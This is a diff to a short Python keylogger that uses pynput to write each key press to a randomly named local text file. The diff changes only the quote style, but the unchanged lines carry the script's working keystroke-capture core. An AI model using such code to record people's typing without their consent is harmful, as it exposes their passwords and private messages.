@@ -1,8 +1,8 @@
 from pynput.keyboard import Key, Listener
 import random
 
-file_name = 'file' + str(random.randint(0, 10000)) + '.txt'
-f = open(file_name, 'w')
+file_name = "file" + str(random.randint(0, 10000)) + ".txt"
+f = open(file_name, "w")
 
 
 def on_press(key):
@@ -24,8 +24,8 @@ def on_press(key):
         listen = "  "
     if listen == "Key.enter":
         listen = "\n"
-    with open(file_name, 'a') as l:
-        l.write('{0} '.format(listen))
+    with open(file_name, "a") as l:
+        l.write("{0} ".format(listen))
 
 
 def off_press(key):
